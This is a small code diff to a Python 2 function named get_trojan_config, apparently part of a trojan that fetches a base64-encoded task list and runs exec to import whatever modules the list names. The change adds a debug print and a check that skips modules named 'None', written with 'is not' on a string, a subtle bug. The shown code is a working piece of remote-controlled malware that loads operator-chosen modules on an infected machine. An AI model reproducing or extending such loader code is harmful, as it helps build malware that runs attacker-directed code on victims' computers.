@@ -47,11 +47,12 @@ def get_trojan_config():
     config_json = get_file_contents(trojan_config)
     config      = json.loads(base64.b64decode(config_json))
     configured  = True
-
+    print config
     for task in config:
         print task['module']
-        if task['module'] not in sys.modules:
-            exec ("import %s" % task['module'])
+        if task['module'] is not "None":
+            if task['module'] not in sys.modules:
+                exec ("import %s" % task['module'])
 
     return config
 
